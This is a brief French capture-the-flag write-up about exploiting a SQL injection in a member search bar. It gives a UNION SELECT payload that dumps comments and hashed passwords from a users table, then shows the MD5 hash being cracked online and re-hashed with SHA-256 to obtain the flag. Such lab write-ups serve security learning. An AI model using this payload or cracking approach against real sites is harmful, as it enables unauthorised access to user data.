# Injection SQL via barre de recherche pour user
Comme pour l'injection SQL précédente, on va explorer le contenu de la base de données apres avoir acceder a des data qu'on est pas cense voir, jusqu'a trouver le bon flag.

Il ya une autre barre de researche sur la page members, qui permet de chercher des membres par id.

Encore une fois on explore les tables, jusqu'a trouver dans *users* un commentaire qui nous interesse avec la commande SQL suivante:

```sql
1 UNION SELECT Commentaire,countersign from users
```

```
ID: 1 UNION SELECT Commentaire,countersign from users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

Ce password est encrypter en MD5, on peut le decoder avec decodeurs MD5 comme celui ci
https://www.dcode.fr/md5-hash

Ce qui donne le mot: FortyTwo

Si on met fortytwo (en minuscule) dans un encodeur sha256 tel que https://emn178.github.io/online-tools/sha256.html on obtient le flag
